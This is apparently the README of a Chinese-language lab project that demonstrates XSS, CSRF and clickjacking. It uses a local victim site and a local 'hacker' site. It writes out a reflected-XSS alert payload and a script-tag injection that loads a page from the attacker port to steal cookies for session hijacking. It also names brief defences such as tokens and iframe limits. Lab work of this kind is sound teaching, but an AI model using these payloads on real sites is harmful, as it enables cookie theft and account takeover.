# web-Safe
基于node的web安全的简单攻击和防御方案(参考了网上的资料，自己整理一下思路代码)


项目代码
>app： 正常的网站  
>hack：模拟黑客攻击的网站  
>使用技术： node+express+react+mysql

#### 一、XSS（Cross-Site Scripting） 跨站脚本攻击

> 原理：恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。

###### 1.代码目录

![WechatIMG3062.jpeg](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ede7f6787a9f423d9a2f3dd39104571b~tplv-k3u1fbpfcp-watermark.image)

###### 2. 建立数据库

![WechatIMG31.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4d3457bc745d48e0b7e907dcdb169f13~tplv-k3u1fbpfcp-watermark.image)

node app/mysql.js 先执行这个文件创建表和数据

![WechatIMG32.jpeg](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f7006b71c5f24e6fa86169a6a2b9e96d~tplv-k3u1fbpfcp-watermark.image)

###### 如图所示

![WechatIMG30.jpeg](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7041550d585b47b7a15cbbfe7497a803~tplv-k3u1fbpfcp-watermark.image)

###### 3.这时候运行项目npm run start 打开home页面

![WechatIMG33.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c16a23d6176f4e089c48614cc5689bf9~tplv-k3u1fbpfcp-watermark.image)


![WechatIMG34.jpeg](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a1d0112bbb4847acaa51d9dc77c36bb5~tplv-k3u1fbpfcp-watermark.image)

这个时候home页面是用react模板写的，`React DOM` 会在渲染的时候把内容（字符串）进行转义，所以字符串形式的标签是不会作为 `HTML` 标签进行处理的，所以输入scipt是不能执行的

所以加了一个利用ejs模板加载的页面xss.html(无论是从url上输入script标签例如http://localhost:4000/xss?text=<script>alert(2)</script>还是直接获取数据库存储的代码都会被执行)

![WechatIMG38.jpeg](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dd8e485586f14ac7940d7d4aa9537f2f~tplv-k3u1fbpfcp-watermark.image)
![WechatIMG37.jpeg](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eb66a7f719f1415b93af26910b2fb788~tplv-k3u1fbpfcp-watermark.image)

![WechatIMG39.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1b9b993bb4f44bf8b84e473377a0e35f~tplv-k3u1fbpfcp-watermark.image)

###### 4.开始利用documen.cookie攻击,按照刚才的方式把<script>alert(1)</script>改成<script src="http://localhost:5000/xss.html"></script>进行攻击

打开http://localhost:4000/xss会看到请求了http://localhost:5000/xss.html的接口
![WechatIMG41.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b334554ec7de40a295062fddfe5a381e~tplv-k3u1fbpfcp-watermark.image)

在控制台可以看到5000端口的黑客网站已经打印出来了cookie，利用cookie我们完全可以在控制台设置cookie直接登录网站
![WechatIMG42.jpeg](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/58551c1ae5544134a4c7ec45b0efd3c6~tplv-k3u1fbpfcp-watermark.image)

#### 二、CSRF 跨站点伪造

原理： 诱导用户打开黑客的网站，在黑客的网站中，利用用户登录状态发起跨站点请求。

1.在登录状态下，打开localhost：5000/csrf.html页面，在控制台上我们看到了setDataList的请求，这个就是提交内容的接口，在4000的home页面可以看到内容改变了
![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/773039b6461b4fdea658653f25ee7b60~tplv-k3u1fbpfcp-watermark.image)

正常网站内容被更改
![WechatIMG44.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fc6d885103d942708b523c3119a58468~tplv-k3u1fbpfcp-watermark.image)


![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9a74e8c231b84167be5efd0050327851~tplv-k3u1fbpfcp-watermark.image)

解决方案（生成token， 接口带上nonce和timesTamp）


![WechatIMG47.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e311794afb5f4fd38e260c55e52cf87c~tplv-k3u1fbpfcp-watermark.image)

![WechatIMG46.jpeg](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/834989dd0c684e7c8be5b405909434b0~tplv-k3u1fbpfcp-watermark.image)

### 三、点击劫持

原理：用户在登陆 A 网站的系统后，被攻击者诱惑打开第三方网站，而第三方网站通过 iframe 引入了 A 网站的页面内容，用户在第三方网站中点击某个按钮（被装饰的按钮），实际上是点击了 A 网站的按钮。

1. 打开http://localhost:5000/clickHijack.html点击按钮，实际上是点击了http://localhost:4000/home的关注按钮，因为iframe嵌入了4000的页面，因为4000
![30.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3ec91ec3ab8b4782abc22da625e43f85~tplv-k3u1fbpfcp-watermark.image)


![31.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f99fa121ec65484a9c7e774154a2d0fe~tplv-k3u1fbpfcp-watermark.image)


![WechatIMG50.jpeg](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9db710bbd0754ce2b179bcc82595e1ca~tplv-k3u1fbpfcp-watermark.image)

解决方案，对iframe嵌入做限制

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bbf3f597d6944b42ab2b8170e21fe8ff~tplv-k3u1fbpfcp-watermark.image)

![WechatIMG51.jpeg](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5d772917b4754fb1a88abe1262d8cb68~tplv-k3u1fbpfcp-watermark.image)
